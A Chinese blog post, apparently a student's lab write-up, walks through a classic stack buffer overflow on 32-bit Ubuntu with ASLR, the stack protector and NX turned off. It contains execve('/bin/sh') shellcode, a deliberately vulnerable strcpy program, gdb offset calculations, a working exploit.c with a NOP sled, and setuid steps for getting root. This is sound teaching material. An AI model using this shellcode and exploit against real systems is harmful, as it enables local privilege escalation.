---
title: 入门-缓冲区溢出与利用
date: 2018-12-07 15:22:38
tags: 缓冲区溢出 实验
---
## 实验原理
利用 strcpy(buf,str) 导致的缓冲区溢出，精心构造str溢出后，覆盖原程序的返回地址，让程序跳转至new_addr,去指定位置执行存放的shellcode，获得root权限

重点：

 - str的构造->计算精确覆盖位置
 - shellcode 编写->提权功能，并转化成汇编
 - exploit 编写

> *Q: 这和控制流劫持一样吗？有啥区别？会不会控制流劫持是劫持eip？这个只是覆盖返回地址，不太一样？查一下啊！*

## 实验步骤

### 1. 环境搭建
1) Ubuntu12.04 32位 （http://releases.ubuntu.com/12.04.5/ubuntu-12.04.5-desktop-i386.iso）
2) 关闭ASLR

    sudo sysctl -w kernel.randomize_va_space = 0
    sudo sysctl kernel.randomize_va_space (用来查当前值是多少，0：关闭ASLR；***1：开启堆随机化？2：开启栈随机化？***)

3）stack-guard-protection和NX在后续gcc编译时关闭

### 2. 脚本编写
1） shellcode：
```
#include <stdio.h>
int main( )
{ 
    char *name[2];
    name[0] = "/bin/sh";
    name[1] = NULL;
    execve(name[0], name, NULL); //主要功能：获得一个shell
}
```
将shellcode转换成汇编形式，并编写call_shellcode调用代码，编译验证能否成功得到shell

*【tips】: 如何编写shellcode（之后单写一篇吧）*

-  call_shellcode.c
```
        /* call_shellcode.c  */
        /*A program that creates a file containing code for launching shell*/
        #include <stdlib.h>
        #include <stdio.h>
        
        const char code[] =
          "\x31\xc0"             /* xorl    %eax,%eax              */
          "\x50"                 /* pushl   %eax                   */
          "\x68""//sh"           /* pushl   $0x68732f2f            */
          "\x68""/bin"           /* pushl   $0x6e69622f            */
          "\x89\xe3"             /* movl    %esp,%ebx              */
          "\x50"                 /* pushl   %eax                   */
          "\x53"                 /* pushl   %ebx                   */
          "\x89\xe1"             /* movl    %esp,%ecx              */
          "\x99"                 /* cdq                            */
          "\xb0\x0b"             /* movb    $0x0b,%al              */
          "\xcd\x80"             /* int     $0x80                  */
        ;  //shellcode反汇编而成
        
        int main(int argc, char **argv)
        {
           char buf[sizeof(code)];
           strcpy(buf, code);
           ((void(*)( ))buf)( ); //？？？
        } 
```
编译运行

    gcc -z execstack -fno-stack-protection -o call_shellcode call_shellcode.c
    ./call_shellcode
    $

成功get shell(可以输id，whoami，ls等验证)

2） stack.c
```
        /* stack.c */
        /* This program has a buffer overflow vulnerability. */
        /* Our task is to exploit this vulnerability */
        #include <stdlib.h>
        #include <stdio.h>
        #include <string.h>
        int bof(char *str)
        {
            char buffer[24];
        
            /* The following statement has a buffer overflow problem */ 
            strcpy(buffer, str);
        
            return 1;
        }
        
        int main(int argc, char **argv)
        {
            char str[517];
            FILE *badfile;                           //创建badfile，之后将shellcode存于此文件
        
            badfile = fopen("badfile", "r");
            fread(str, sizeof(char), 517, badfile);  //shellcode赋给str
            bof(str);
        
            printf("Returned Properly\n");
            return 1;
        }
```

关闭地址随机化后，每次运行地址相同。gdb动态调试stack,利用得到的ebp和buffer地址，计算应覆盖的返回地址值，用于exploit的编写

动态调试：

    $ gcc -z execstack -fno-stack-protector -g -o stack stack.c  //要加-g 参数才能构建符号表
    $ touch badfile
    $ gdb stack
    GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
    Copyright (C) 2012 Free Software Foundation, Inc.
    License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
    This is free software: you are free to change and redistribute it.
    There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
    and "show warranty" for details.
    This GDB was configured as "i686-linux-gnu".
    For bug reporting instructions, please see:
    <http://bugs.launchpad.net/gdb-linaro/>...
    Reading symbols from /home/x/Desktop/xx/stack...done.
    (gdb) b bof
    Breakpoint 1 at 0x804848a: file stack.c, line 14.
    (gdb) run
    Starting program: /home/x/Desktop/xx/stack 
    Breakpoint 1, bof (
        str=0xbffff0f7 "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220X\361\377\277\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...) at stack.c:14
    14	    strcpy(buffer, str);
    (gdb) p $ebp
        $1 = (void *) 0xbffff0d8
    (gdb) p &buffer
    $2 = (char (*)[24]) 0xbffff0b8
        (gdb) p 0xbffff0d8-0xbffff0b8
        $4 = 32
        (gdb) quit

根据调试结果可得，`ebp = 0xbffff0d8`，返回地址在ebp上面，所以是`ret = 0xbffff0d8+4`
可以跳转去的最小地址是 `0xbffff0d8+8`
输入badfile中的buffer地址与ebp差32，返回地址ret在ebp上4，所以`ret = buffer+32+4`

   

       4 |   ret
       4 |   ebp
      32 |   ...
         |   ...     
         |   buffer[0]

3） exploit.c
为保证成功率，shellcode之前可以添加一些NOP，保证即使地址稍有偏移也可以完成利用
```
    /* exploit.c  */
    /* A program that creates a file containing code for launching shell*/
    #include <stdlib.h>
    #include <stdio.h>
    #include <string.h>
    char shellcode[]=
        "\x31\xc0"             /* xorl    %eax,%eax              */
        "\x50"                 /* pushl   %eax                   */
        "\x68""//sh"           /* pushl   $0x68732f2f            */
        "\x68""/bin"           /* pushl   $0x6e69622f            */
        "\x89\xe3"             /* movl    %esp,%ebx              */
        "\x50"                 /* pushl   %eax                   */
        "\x53"                 /* pushl   %ebx                   */
        "\x89\xe1"             /* movl    %esp,%ecx              */
        "\x99"                 /* cdq                            */
        "\xb0\x0b"             /* movb    $0x0b,%al              */
        "\xcd\x80"             /* int     $0x80                  */
    ;
    
    void main(int argc, char **argv)
    {
        char buffer[517];
        FILE *badfile;
    
        /* Initialize buffer with 0x90 (NOP instruction) */
        memset(&buffer, 0x90, 517);
    
        /* You need to fill the buffer with appropriate contents here */ 
        *((long*)(buffer+36)) = 0xbffff0d8 + 0x80;              //buffer+32+4 根据上述调试结果得到
        memcpy(buffer+sizeof(buffer)-sizeof(shellcode), shellcode, sizeof(shellcode));   
    
        /* Save the contents to the file "badfile" */
        badfile = fopen("./badfile", "w");
        fwrite(buffer, 517, 1, badfile);
        fclose(badfile);
    }
```

### 3. 脚本运行

    gcc -o exploit exploit.c
    ./exploit
    ./stack
    $ id
    uid=1000(s) gid=1000(s) groups=1000(s),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
成功！ 

PS： 对stack设置UID，可以拿到root权限

    $ gcc -o stack -z execstack -fno-stack-protector stack.c
    
    $ sudo chown root stack
    
    $ sudo chmod 4755 stack

## 小结
我好讨厌写博客，实验做很快，复盘要很久（尤其调格式简直逼死强迫症==）不过回顾一下理清思路还挺有必要的，写博客麻烦还不是因为脑子乱==sad
通过这一个缓冲区溢出的知识点可以展开再写几篇
> 如何编写shellcode
控制流劫持与返回地址覆盖的区别
VMware tools安装

先想到这么多，之后再补充